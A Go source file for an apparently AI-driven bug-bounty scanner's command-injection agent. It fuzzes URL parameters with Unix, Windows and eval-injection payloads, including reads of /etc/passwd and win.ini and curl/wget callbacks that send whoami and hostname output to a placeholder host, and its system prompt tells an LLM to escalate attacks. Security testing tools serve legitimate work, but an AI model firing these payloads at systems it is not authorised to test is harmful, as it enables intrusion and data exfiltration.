// Package rce implements the Remote Code Execution / Command Injection specialist agent.
package rce

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "RCE Agent" }
func (a *Agent) ID() string           { return "rce" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	vulnContext, _ := item.Payload["context"].(string)
	priority, _ := item.Payload["priority"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	payloads := generatePayloads(vulnContext)

	// Prepend suggested_payloads (KG-proven + adaptive + WAF-bypass) so they run first
	if raw, ok := item.Payload["suggested_payloads"]; ok {
		if sp, ok := raw.([]string); ok && len(sp) > 0 {
			suggested := make([]rcePayload, 0, len(sp))
			for _, s := range sp {
				suggested = append(suggested, rcePayload{payload: s, technique: "suggested", osTarget: "unknown"})
			}
			payloads = append(suggested, payloads...)
		}
	}

	// Extract URL parameters to inject into
	params := extractParams(targetURL)
	if len(params) == 0 {
		params = []string{"cmd"}
	}
	const maxParams = 3
	const maxPayloads = 10
	if len(params) > maxParams {
		params = params[:maxParams]
	}
	if len(payloads) > maxPayloads {
		payloads = payloads[:maxPayloads]
	}

	fc := base.NewFuzzClient()
	method := detectMethod(vulnContext)
	var findings []*base.Finding

	for _, paramName := range params {
		for _, p := range payloads {
			var result base.ProbeResult
			if method == "POST" {
				result = fc.ProbePOST(ctx, targetURL, paramName, p.payload)
			} else {
				result = fc.ProbeGET(ctx, targetURL, paramName, p.payload)
			}
			if result.Error != nil {
				continue
			}

			conf := base.DetectRCEOutput(result.Body)
			if conf == 0.0 {
				continue
			}

			findings = append(findings, &base.Finding{
				Type:       "RCE",
				URL:        targetURL,
				Parameter:  paramName,
				Payload:    p.payload,
				Severity:   mapPriorityToSeverity(priority),
				Confidence: conf,
				Evidence: map[string]interface{}{
					"technique":   p.technique,
					"os_target":   p.osTarget,
					"status_code": result.StatusCode,
				},
				Method: method,
			})
		}
	}

	return findings, nil
}

// extractParams returns query parameter names from a URL.
func extractParams(rawURL string) []string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	q, err := url.ParseQuery(u.RawQuery)
	if err != nil || len(q) == 0 {
		return nil
	}
	params := make([]string, 0, len(q))
	for k := range q {
		params = append(params, k)
	}
	return params
}

type rcePayload struct {
	payload   string
	technique string
	osTarget  string
}

func generatePayloads(vulnCtx string) []rcePayload {
	var payloads []rcePayload

	unixPayloads := []rcePayload{
		{"; id", "semicolon_chain", "unix"},
		{"| id", "pipe_chain", "unix"},
		{"|| id", "or_chain", "unix"},
		{"& id", "background_chain", "unix"},
		{"`id`", "backtick_subst", "unix"},
		{"$(id)", "dollar_subst", "unix"},
		{"; cat /etc/passwd", "file_read", "unix"},
		{"; curl CALLBACK_URL/$(whoami)", "oob_exfil", "unix"},
		{"; wget CALLBACK_URL/$(hostname)", "oob_wget", "unix"},
		{"%0aid", "newline_inject", "unix"},
	}
	payloads = append(payloads, unixPayloads...)

	winPayloads := []rcePayload{
		{"& whoami", "ampersand_chain", "windows"},
		{"| type C:\\windows\\win.ini", "pipe_file_read", "windows"},
		{"|| dir", "or_chain", "windows"},
		{"; ping -n 5 127.0.0.1", "time_delay", "windows"},
	}
	payloads = append(payloads, winPayloads...)

	ctx := strings.ToLower(vulnCtx)
	if strings.Contains(ctx, "eval") || strings.Contains(ctx, "exec") || strings.Contains(ctx, "python") || strings.Contains(ctx, "node") {
		evalPayloads := []rcePayload{
			{"__import__('os').popen('id').read()", "python_eval", "python"},
			{"require('child_process').execSync('id').toString()", "node_eval", "node"},
			{"Runtime.getRuntime().exec('id')", "java_runtime", "java"},
			{"system('id')", "php_system", "php"},
		}
		payloads = append(payloads, evalPayloads...)
	}

	return payloads
}

func detectMethod(ctx string) string {
	if strings.Contains(strings.ToLower(ctx), "post") {
		return "POST"
	}
	return "GET"
}

func mapPriorityToSeverity(priority string) string {
	switch strings.ToLower(priority) {
	case "critical":
		return "critical"
	case "high":
		return "high"
	default:
		return "critical" // RCE is always critical
	}
}

const defaultSystemPrompt = `You are an elite RCE/Command Injection specialist with deep expertise in:
- OS command chaining (;, |, ||, &, &&, backticks, $())
- Eval injection (Python eval, Node.js require, PHP system)
- Encoding bypasses (URL encoding, hex, newline injection)
- Blind RCE via time delays and OOB callbacks
- Privilege escalation post-exploitation

RULES:
1. RCE is ALWAYS critical severity
2. Start with simple chaining (;id, |id), escalate to encoded variants
3. Use OOB callbacks for blind confirmation
4. Generate payloads for both Unix and Windows
5. If eval context detected, use language-specific payloads`
